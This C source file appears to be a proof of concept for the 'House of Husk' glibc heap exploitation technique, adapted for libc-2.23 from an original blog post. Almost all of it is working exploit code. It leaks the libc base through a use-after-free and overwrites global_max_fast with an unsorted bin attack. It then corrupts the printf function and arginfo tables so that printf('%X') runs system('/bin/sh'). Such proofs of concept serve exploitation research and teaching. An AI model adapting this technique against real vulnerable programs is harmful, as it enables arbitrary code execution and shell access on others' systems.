/**
 * Husk's method - House of Husk <--- Original post can be found at https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507 
 * My Post can be found at ....
 * This PoC is supposed to be run with libc-2.23; the default for Ubuntu 16.04 
 * Originally exploit code for GLibC 2.27 can be found at https://github.com/ptr-yudai/House-of-Husk/blob/master/poc-husk.c.

Compile: 
- `gcc poc-husk.c -o husk -g`

Run: 
- `./husk`
 */

#include <stdio.h>
#include <stdlib.h>

// Offsets for the program
#define offset2size(ofs) ((ofs) * 2)
#define MAIN_ARENA       0x3c4b20
#define MAIN_ARENA_DELTA 0x58 // Difference between main_arena value and the leaked value via the UAF
#define GLOBAL_MAX_FAST  0x3c67f8
#define PRINTF_FUNCTABLE 0x3c9468
#define PRINTF_ARGINFO   0x3c5730

// POC function. This could easily be a ONE_GADGET
void* pop_shell(){
	system("/bin/sh");
}

int main (void)
{

  // Wait... Press enter to continue
  char tmp; 
  scanf("%c", &tmp);

  unsigned long libc_base;
  char *a[10];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL); // make printf quiet

  // leak libc. Used for the UAF chunk
  a[0] = malloc(0x500);
 
  // Calculating the size: the (bytes to point) * 2
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA)); // PRINTF_FUNCTION_TABLE
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA)); // PRINTF_ARGINFO_TABLE

  // Avoid consolidation... Actually, not needed with the current ordering.
  //a[3] = malloc(0x500); 

  free(a[0]); // Free in order to get the UAF

  // Calculate the base of libc. This is done via the UAF memory leak in the unsorted_bin ptr
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;

  // Leak LibC main_arena
  printf("libc @ 0x%lx\n", libc_base);

  // Prepare fake printf arginfo table
  *(unsigned long*)(a[2] + ('X' - 2) * 8) = (unsigned long) pop_shell;

  // unsorted bin attack to overwrite GLOBAL_MAX_FAST
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); // overwrite global_max_fast

  // Trigger the overwrite of the PRINTF_FUNCTION_TABLE to a non-null value
  free(a[1]); 

  // Trigger the overwrite of the PRINTF_ARGINFO_TABLE value with a heap pointer. This will set a new function pointer table at this address.
  free(a[2]);

  // IGNITE: Trigger the code execution
  getchar();
  printf("%X", 0);
  
  return 0;
}
